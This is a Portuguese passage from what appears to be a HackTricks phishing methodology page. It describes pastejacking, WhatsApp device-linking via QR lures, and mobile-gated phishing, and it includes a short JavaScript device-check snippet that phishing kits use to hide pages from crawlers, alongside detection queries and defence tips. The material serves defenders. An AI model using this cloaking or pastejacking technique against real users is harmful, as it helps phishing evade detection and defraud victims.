Monitore eventos do AzureAD/AWS/Okta em que **`deleteMFA` + `addMFA`** ocorram **com poucos minutos de diferença e a partir do mesmo IP**.



## Clipboard Hijacking / Pastejacking

Os atacantes podem copiar silenciosamente comandos maliciosos para a área de transferência da vítima a partir de uma página comprometida ou typosquatted e, em seguida, induzir o usuário a colá-los em **Win + R**, **Win + X** ou em uma janela de terminal, executando código arbitrário sem nenhum download ou anexo.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing móvel e distribuição de aplicativos maliciosos (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Sequestro de vinculação de dispositivos do WhatsApp por engenharia social com QR Code
* Uma página de isca (por exemplo, um “canal” falso de ministério/CERT) exibe um QR Code do WhatsApp Web/Desktop e instrui a vítima a escaneá-lo, adicionando silenciosamente o atacante como **dispositivo vinculado**.<sup>[[12]](#references)</sup>
* O atacante obtém imediatamente visibilidade das conversas e dos contatos até que a sessão seja removida. As vítimas podem ver posteriormente uma notificação de “novo dispositivo vinculado”; os defensores podem procurar eventos inesperados de vinculação de dispositivos ocorridos pouco depois de visitas a páginas de QR Code não confiáveis.

### Phishing condicionado a dispositivos móveis para escapar de crawlers/sandboxes
Os operadores cada vez mais condicionam seus fluxos de phishing a uma verificação simples do dispositivo, para que os crawlers de desktop nunca cheguem às páginas finais. Um padrão comum é um pequeno script que testa se o DOM permite toque e envia o resultado a um endpoint do servidor; clientes que não são móveis recebem HTTP 500 (ou uma página em branco), enquanto usuários de dispositivos móveis recebem o fluxo completo.<sup>[[7]](#references)</sup>

Trecho mínimo do cliente (lógica típica):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` lógica (simplificada):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportamento do servidor frequentemente observado:
- Define um cookie de sessão durante o primeiro carregamento.
- Aceita `POST /detect {"is_mobile":true|false}`.
- Retorna 500 (ou um placeholder) para GETs subsequentes quando `is_mobile=false`; só serve o phishing se `true`.

Heurísticas de busca e detecção:
- Consulta do urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria da web: sequência `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para dispositivos não móveis; os caminhos legítimos de vítimas em dispositivos móveis retornam 200, seguidos de HTML/JS.
- Bloqueie ou analise com atenção páginas que condicionam o conteúdo exclusivamente a `ontouchstart` ou a verificações semelhantes do dispositivo.

Dicas de defesa:
- Execute crawlers com impressões digitais semelhantes às de dispositivos móveis e JS habilitado para revelar conteúdo condicionado.
- Gere alertas para respostas 500 suspeitas após `POST /detect` em domínios recém-registrados.

## References

- [1] [Geração de variações de domínio usadas em phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Encontrando phishing: ferramentas e técnicas (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Roubar credenciais e contornar 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Como instalar e configurar DKIM com Postfix no Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Relatório global de resposta a incidentes Unit 42 de 2025 – Edição de engenharia social](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infraestrutura de phishing condicionada a dispositivos móveis e heurísticas (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [A próxima fronteira dos ataques de montagem em tempo de execução: usando LLMs para gerar JavaScript de phishing em tempo real](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Falsificação de identidade, sequestro de cliques e TDS: por dentro de um ecossistema de distribuição de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Sequestro de tráfego para windows.com da Microsoft usando inversão de bits (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amor? Na verdade: aplicativo de namoro falso usado como isca em campanha direcionada de spyware no Paquistão](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs e amostras do ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
